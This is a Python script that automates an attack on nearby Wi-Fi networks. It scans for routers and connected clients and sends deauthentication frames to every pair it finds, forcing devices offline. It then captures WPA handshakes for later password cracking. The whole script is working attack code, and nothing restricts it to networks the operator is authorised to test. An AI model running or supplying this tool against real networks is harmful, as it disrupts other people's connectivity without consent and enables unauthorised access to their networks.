#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import shutil
import re
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(message)s',
    handlers=[
        logging.FileHandler("netdumper.log"),
        logging.StreamHandler()
    ]
)

MAC_REGEX = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")

def run_command(command, timeout=None, shell=True):
    try:
        result = subprocess.run(
            command,
            shell=shell,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=timeout
        )
        return result.stdout

    except subprocess.TimeoutExpired as te:
        return te.stdout if te.stdout else ""

    except subprocess.CalledProcessError as e:
        logging.error(f"Error: {command}\nStderr: {e.stderr}")
        raise e

def package_installer():
    logging.info("Installing Packages:")

    packages = {
        "iw": "iw",
        "aircrack-ng": "aircrack-ng",
        "ifconfig": "net-tools",
        "iwconfig": "wireless-tools"
    }

    missing_packages = []

    for binary, package in packages.items():
        if shutil.which(binary) is None:
            missing_packages.append(package)

    if missing_packages:
        try:
            logging.info(f"Installing Missing Packages: {missing_packages}")

            run_command("sudo apt update")

            for package in missing_packages:
                run_command(f"sudo apt install {package} -y")

            logging.info("All Packages Were Installed Successfully.")

        except Exception as e:
            logging.error(f"Package Installation Failed: {e}")
            sys.exit(1)

    else:
        logging.info("All Packages Are Already Present In The System.")

def mapping_interfaces():
    logging.info("Locating And Categorizing Wi-Fi Plates...")

    interfaces_info = {
        "managed": None,
        "monitor": None
    }

    try:
        iw_output = run_command("sudo iw dev")

        current_interface = None

        for ln in iw_output.split('\n'):

            if ln.strip().startswith("Interface"):
                current_interface = ln.split()[1]

            if ln.strip().startswith("type") and current_interface:
                iface_type = ln.split()[1]

                if iface_type == "managed" and not interfaces_info["managed"]:
                    interfaces_info["managed"] = current_interface

                elif iface_type == "monitor" and not interfaces_info["monitor"]:
                    interfaces_info["monitor"] = current_interface

        run_command("sudo ifconfig")

        logging.info(
            f"Interfaces Identified -> Managed: "
            f"{interfaces_info['managed']} | "
            f"Monitor: {interfaces_info['monitor']}"
        )

        return interfaces_info

    except Exception as e:
        logging.error(f"Error Mapping Network Interfaces: {e}")
        return interfaces_info

def start(interfaces):
    target_plate = interfaces["managed"]
    
    if not target_plate:
        logging.error(
            "No Network Plates In 'managed' Mode "
            "Were Found To Initiate The Process."
        )
        return
        
    monitor_plate = interfaces["monitor"]
    try:
        if not monitor_plate:
            logging.info(f"Starting Monitor-Mode In Plate: {target_plate}...")
            run_command(f"sudo airmon-ng start {target_plate}")
            interfaces = mapping_interfaces()
            monitor_plate = interfaces["monitor"]
            if not monitor_plate:
                raise Exception(
                    "Monitor interface could not be detected "
                    "After Enabling Monitor Mode."
                )
        else:
            logging.info(f"Plate: {monitor_plate} Already In Monitor-Mode")
            
        logging.info(f"Enabling The Interface: {monitor_plate}...")
        run_command(f"sudo ifconfig {monitor_plate} up")
        
        logging.info("Checking If The Monitor Interface Is Active...")
        ifconfig_check = run_command("sudo ifconfig")
        if monitor_plate not in ifconfig_check:
            raise Exception(
                f"The: {monitor_plate} Interface Was Not "
                f"Found To Be Active On The System."
            )
            
        logging.info(
            f"Starting Temporary Scan With airodump-ng "
            f"On The Board: {monitor_plate}..."
        )
        cap_prefix = "airodump_temp"
        try:
            subprocess.run(
                f"airodump-ng --output-format csv -w {cap_prefix} {monitor_plate}",
                shell=True,
                timeout=60,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except subprocess.TimeoutExpired:
            pass
            
        time.sleep(2)
        csv_file = f"{cap_prefix}-01.csv"
        if os.path.exists(csv_file):
            shutil.copy(csv_file, "airodump.txt")
            logging.info("Monitoring Data Successfully Saved To 'airodump.txt'.")
        else:
            logging.warning(
                "No Data Was Captured By airodump-ng, "
                "Or The File Was Not Generated."
            )
            return
            
        logging.info("Parsing 'airodump.txt' To Identify Targets BSSID And Clients...")
        targets = []
        with open("airodump.txt", "r", encoding="utf-8", errors="ignore") as f:
            lns = f.readlines()
            
        reading_clients = False
        channels_routers = {}
        for ln in lns:
            parts = [p.strip() for p in ln.split(',')]
            if len(parts) < 2:
                continue
            if "Station MAC" in parts[0] or "Station" in parts[0]:
                reading_clients = True
                continue
            if "BSSID" in parts[0]:
                continue
            if not reading_clients and len(parts) >= 4 and MAC_REGEX.match(parts[0]):
                bssid = parts[0]
                channel = parts[3]
                if channel.isdigit():
                    channels_routers[bssid] = channel
            if reading_clients and len(parts) >= 6:
                mac_client = parts[0]
                mac_router = parts[5]
                if MAC_REGEX.match(mac_client) and mac_router in channels_routers:
                    targets.append({
                        "mac_router": mac_router,
                        "mac_client": mac_client,
                        "channel": channels_routers[mac_router]
                    })
                    
        if not targets:
            logging.warning("No Active Router <-> Client Pair Was Found For Deauthentication.")
            return
            
        logging.info(f"Found {len(targets)} Targets For Deauth.")
        
        for idx, target in enumerate(targets):
            mac_rot = target["mac_router"]
            mac_cli = target["mac_client"]
            channel = target["channel"]
            
            logging.info(
                f"Processing Target {idx} "
                f"[Router: {mac_rot} | Client: {mac_cli} | Channel: {channel}]"
            )
            
            logging.info(
                f"Deauthenticating -> aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
            )
            run_command(
                f"sudo aireplay-ng -0 1 -a {mac_rot} -c {mac_cli} {monitor_plate}"
            )
            
            cap_file = f"package_{idx}"
            logging.info(
                f"Starting Dynamic Capture for Handshake: {cap_file}.cap on Channel {channel}..."
            )
            
            cmd_capture = (
                f"sudo airodump-ng --bssid {mac_rot} --channel {channel} "
                f"-w {cap_file} {monitor_plate}"
            )
            
            proc_capture = subprocess.Popen(
                cmd_capture,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            handshake_captured = False
            max_wait_attempts = 60
            attempt = 0
            
            file_to_check = f"{cap_file}-01.cap"
            
            while attempt < max_wait_attempts:
                time.sleep(1)
                attempt += 1
                
                if os.path.exists(file_to_check):
                    check_cmd = f"aircrack-ng -b {mac_rot} {file_to_check}"
                    check_result = subprocess.run(
                        check_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    
                    if "1 handshake" in check_result.stdout:
                        logging.info(f"[SUCCESS] 4-Way Handshake captured for BSSID {mac_rot}!")
                        handshake_captured = True
                        break
            
            proc_capture.terminate()
            try:
                proc_capture.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc_capture.kill()
                
            if handshake_captured:
                logging.info(f"Packet Capture {cap_file} Completed dynamically via EAPOL filter verification.")
            else:
                logging.warning(f"Capture hit timeout limit without confirming a valid handshake for BSSID {mac_rot}.")
                
    except Exception as e:
        logging.error(f"A Critical Failure Occurred During The Execution Of The Flow: {e}")
        
    finally:
        logging.info("Interrupting Monitor Mode And Restoring Wi-Fi Network...")
        try:
            if monitor_plate:
                run_command(f"sudo airmon-ng stop {monitor_plate}")
            try:
                run_command("sudo systemctl restart NetworkManager")
            except Exception:
                pass
            run_command("sudo nmcli radio wifi on")
            logging.info("Network interfaces restored and NetworkManager restarted successfully.")
        except Exception as cleanup_error:
            logging.error(f"Error while trying to restore default network services: {cleanup_error}")

if __name__ == "__main__":

    if os.getuid() != 0:
        print("[ERROR] Root Authority Is Required.")
        sys.exit(1)

    package_installer()

    mapped_interfaces = mapping_interfaces()

    start(mapped_interfaces)